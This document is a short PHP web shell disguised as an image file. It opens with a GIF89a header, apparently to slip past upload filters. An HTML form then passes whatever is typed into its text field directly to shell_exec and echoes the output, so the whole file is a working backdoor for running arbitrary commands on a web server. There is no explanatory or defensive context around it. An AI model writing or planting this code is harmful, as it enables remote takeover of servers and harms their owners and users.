GIF89a;







<form method="post">
<input type="text" name="t1" id="t1">
<input type="submit" name="submit">
</form>
<?php
header("Content-Type:text/html; charset=utf-8");
if (isset($_POST)) {
	$output = shell_exec($_POST["t1"]);
	echo $output;
}
?>

